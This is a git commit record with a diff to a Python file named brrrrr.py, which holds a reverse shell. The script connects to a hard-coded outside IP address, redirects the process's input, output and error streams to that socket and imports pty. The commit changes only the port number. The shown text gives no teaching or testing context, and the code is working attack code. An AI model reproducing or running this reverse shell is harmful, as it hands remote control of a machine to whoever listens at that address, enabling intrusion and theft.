e5d7117dd185cc746703608b491c0e74f4fc46b6
kekeongithublolmayk <83241804+kekeongithublolmayk@users.noreply.github.com>
2022-01-30 05:19:06 +0100

    Update brrrrr.py

--- brrrrr.py
+++ brrrrr.py
@@ -1,6 +1,6 @@
 import socket,os,pty
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("109.128.251.207",1234))
+s.connect(("109.128.251.207",12345))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
